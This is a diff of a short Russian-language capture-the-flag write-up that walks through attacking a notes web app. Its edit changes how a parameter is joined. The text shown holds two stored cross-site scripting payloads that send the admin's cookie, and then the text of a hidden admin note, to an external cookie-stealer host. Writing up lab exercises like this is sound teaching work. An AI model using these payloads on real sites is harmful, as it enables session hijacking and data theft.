@@ -7,12 +7,12 @@
 
 4. Забираем куку админа передав в http://notes.ctf2019.rocks/append параметры 
 append=<script>document.location='http://89.163.129.121:9999/cookiestealer.php?c='.concat(document.сokkie);</script>
-и id=1   
+&id=1   
 и получаем доп флаг.
 
 5. Смотрим js path к hidden записи админа.
 Передаем  в http://notes.ctf2019.rocks/append параметры 
 append=<script type="text/javascript">document.location='http://89.163.129.121:9999/cookiestealer.php?c='.concat(document.querySelector('body > div:nth-child(2) > div:nth-child(1) > p:nth-child(2)').innerText);</script>
-и id=1 
+&id=1 
 и получаем влаг.
 
